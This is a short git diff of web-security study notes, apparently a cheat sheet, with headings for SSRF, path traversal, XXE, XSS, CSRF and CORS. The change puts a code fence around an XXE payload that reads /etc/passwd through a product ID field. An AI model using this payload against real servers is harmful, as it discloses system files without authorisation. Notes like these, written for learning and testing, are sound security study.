@@ -22,9 +22,11 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/dir
 ### Server-side request forge (SSRF)
 ### Path traversal
 ### XXE Injection
-  <?xml version="1.0" encoding="UTF-8"?>
-  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-  <stockCheck><productId>&xxe;</productId></stockCheck>  
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
 ### Cross-site scripting (XSS)
 ### Cross-site request forge (CSRF)
 ### Cross-origin resource sharing (CORS)
